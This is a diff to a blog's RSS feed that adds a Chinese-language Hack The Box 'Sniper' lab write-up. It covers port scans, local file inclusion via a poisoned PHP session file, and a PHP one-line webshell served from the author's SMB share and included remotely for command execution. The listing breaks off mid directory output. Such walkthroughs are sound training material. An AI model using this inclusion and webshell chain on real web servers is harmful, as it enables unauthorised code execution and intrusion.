@@ -5,8 +5,581 @@
         <description>Recent content in Posts on Welcome My Hack&#39;s Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Wed, 30 Sep 2026 14:00:00 +0800</lastBuildDate>
+        <lastBuildDate>Thu, 08 Oct 2026 14:00:00 +0800</lastBuildDate>
         <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HTB-Sniper Writeup</title>
+            <link>http://localhost:1313/posts/htb-sniper-writeup/</link>
+            <pubDate>Thu, 08 Oct 2026 14:00:00 +0800</pubDate>
+            
+            <guid>http://localhost:1313/posts/htb-sniper-writeup/</guid>
+            <description>&lt;h2 id=&#34;nmap-扫描&#34;&gt;Nmap 扫描&lt;/h2&gt;
+&lt;p&gt;对机器进行全端口扫描。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Work/Kali/Sniper&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ sudo nmap --min-rate &lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt; -p- 10.129.229.6 -oA Nmap/ports
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sudo&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; password &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; kali:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.98 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2026-09-30 03:42 -0400
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.229.6
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.11s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65531&lt;/span&gt; filtered tcp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;no-response&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT    STATE SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp  open  http
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;135/tcp open  msrpc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;139/tcp open  netbios-ssn
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;445/tcp open  microsoft-ds
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 14.22 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;对存活的端口进行详细信息扫描，80 端口跑的是 IIS 10.0 加 PHP 7.3.1，同时开启了 SMB。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Work/Kali/Sniper&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ sudo nmap -sT -sC -sV -O -p80,135,139,445 10.129.229.6 -oA Nmap/detail
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.98 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2026-09-30 03:44 -0400
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.229.6
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.11s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT    STATE SERVICE       VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp  open  http          Microsoft IIS httpd 10.0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-server-header: Microsoft-IIS/10.0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: Sniper Co.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| http-methods:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_  Potentially risky methods: TRACE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;135/tcp open  msrpc         Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;445/tcp open  microsoft-ds?
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Warning: OSScan results may be unreliable because we could not find at least &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; open and &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; closed port
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Device type: general purpose
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Running &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;JUST GUESSING&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Microsoft Windows 2019|&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;97%&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Aggressive OS guesses: Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;97%&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, Microsoft Windows &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1903&lt;/span&gt; - 21H1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;91%&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;No exact OS matches &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; host &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;test conditions non-ideal&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host script results:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| smb2-security-mode:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   3.1.1:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_    Message signing enabled but not required
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| smb2-time:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   date: 2026-09-30T14:43:45
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_  start_date: N/A
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_clock-skew: 6h59m02s
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 57.94 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;web-渗透&#34;&gt;Web 渗透&lt;/h2&gt;
+&lt;p&gt;浏览 80 端口，发现开放注册功能，注册一个用户试试看。&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h2 id="nmap-扫描">Nmap 扫描</h2>
+<p>对机器进行全端口扫描。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.129.229.6 -oA Nmap/ports
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-09-30 03:42 -0400
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.229.6
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.11s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65531</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp  open  http
+</span></span><span style="display:flex;"><span>135/tcp open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.22 seconds
+</span></span></code></pre></div><p>对存活的端口进行详细信息扫描，80 端口跑的是 IIS 10.0 加 PHP 7.3.1，同时开启了 SMB。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sT -sC -sV -O -p80,135,139,445 10.129.229.6 -oA Nmap/detail
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-09-30 03:44 -0400
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.229.6
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.11s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>80/tcp  open  http          Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>|_http-title: Sniper Co.
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>135/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds?
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 2019|<span style="color:#ae81ff">10</span> <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">1903</span> - 21H1 <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   3.1.1:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2026-09-30T14:43:45
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>|_clock-skew: 6h59m02s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 57.94 seconds
+</span></span></code></pre></div><h2 id="web-渗透">Web 渗透</h2>
+<p>浏览 80 端口，发现开放注册功能，注册一个用户试试看。</p>
+<p><img src="Pasted%20image%2020260930154900.png" alt=""></p>
+<p>登录后没有更多发现。</p>
+<p><img src="Pasted%20image%2020260930154936.png" alt=""></p>
+<p>继续浏览网站，发现参数 <code>lang</code> 后面跟着文件，很可能存在文件包含。</p>
+<p><img src="Pasted%20image%2020260930160547.png" alt=""></p>
+<h2 id="lfi">LFI</h2>
+<p>尝试修改 <code>lang</code> 的参数，确认存在文件包含。</p>
+<p><img src="Pasted%20image%2020261008102630.png" alt=""></p>
+<p>注册帐号可以获得 PHPSESSID。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>GET /user/index.php HTTP/1.1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host: 10.129.229.6
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Cache-Control: max-age<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.9
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/146.0.0.0 Safari/537.36
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style="color:#f92672">=</span>0.8,application/signed-exchange;v<span style="color:#f92672">=</span>b3;q<span style="color:#f92672">=</span>0.7
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Referer: http://10.129.229.6/user/login.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Cookie: PHPSESSID<span style="color:#f92672">=</span>mambsjsgcvp1828g803sba8bhp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span></code></pre></div><p>PHP 在 Windows 上把会话写进 <code>C:\Windows\Temp\sess_&lt;PHPSESSID&gt;</code>，注册时的用户名会原样落进去。</p>
+<p>注册借口会把 <code>$、(、[、_、;</code> 这类用户名删掉，所以经典的 webshell 存不进去，只能改用反引号把命令夹在用户名里。</p>
+<p>注册一个恶意用户名，拿到 PHPSESSID 可以尝试包含获得代码执行。</p>
+<p><img src="Pasted%20image%2020261008111218.png" alt=""></p>
+<p>注册拿到 PHPSESSID。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>GET /user/index.php HTTP/1.1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host: 10.129.229.6
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Cache-Control: max-age<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.9
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/146.0.0.0 Safari/537.36
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style="color:#f92672">=</span>0.8,application/signed-exchange;v<span style="color:#f92672">=</span>b3;q<span style="color:#f92672">=</span>0.7
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Referer: http://10.129.229.6/user/login.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Cookie: PHPSESSID<span style="color:#f92672">=</span>8k77ioeaq891vo4kkovf4n8ba3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span></code></pre></div><p>尝试进行包含，成功了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -s <span style="color:#e6db74">&#39;http://10.129.229.6/blog/?lang=/Windows/Temp/sess_8k77ioeaq891vo4kkovf4n8ba3&#39;</span>
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span><span style="display:flex;"><span>username|s:37:<span style="color:#e6db74">&#34;z3&#34;</span>;&lt;/body&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span></code></pre></div><p>成功执行 <code>whoami</code> 拿到结果，证明了代码执行的可行性。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -s <span style="color:#e6db74">&#39;http://10.129.229.6/blog/?lang=/Windows/Temp/o&#39;</span>
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\i</span>usr
+</span></span><span style="display:flex;"><span>&lt;/body&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span></code></pre></div><p>写一个一句话木马。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ printf <span style="color:#e6db74">&#39;%s&#39;</span> <span style="color:#e6db74">&#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> &gt; shell.php
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat shell.php
+</span></span><span style="display:flex;"><span>&lt;?php system<span style="color:#f92672">(</span>$_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;cmd&#34;</span><span style="color:#f92672">])</span>; ?&gt;                                                                                                                                          
+</span></span></code></pre></div><p>起一个允许匿名访问的共享。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-smbserver -smb2support share /home/kali/Work/Kali/Sniper 
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span></code></pre></div><p>执行命令 <code>cd</code> 可以获得当前的工作目录。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -s <span style="color:#e6db74">&#39;http://10.129.229.6/blog/?lang=//10.10.16.151/share/shell.php&amp;cmd=cd&#39;</span>
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\i</span>netpub<span style="color:#ae81ff">\w</span>wwroot<span style="color:#ae81ff">\b</span>log
+</span></span><span style="display:flex;"><span>&lt;/body&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span></code></pre></div><p>执行 <code>dir</code> 查看当前目录下是否存在有价值的文件，结果是没有。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -s -G <span style="color:#e6db74">&#39;http://10.129.229.6/blog/?lang=//10.10.16.151/share/shell.php&#39;</span> --data-urlencode <span style="color:#e6db74">&#39;cmd=dir C:\inetpub\wwwroot&#39;</span>
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is AE98-73A8
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:<span style="color:#ae81ff">\i</span>netpub<span style="color:#ae81ff">\w</span>wwroot
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>04/11/2019  10:51 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>04/11/2019  10:51 AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>04/11/2019  05:23 AM    &lt;DIR&gt;          blog
+</span></span><span style="display:flex;"><span>04/11/2019  05:23 AM    &lt;DIR&gt;          css
+</span></span><span style="display:flex;"><span>04/11/2019  05:23 AM    &lt;DIR&gt;          images
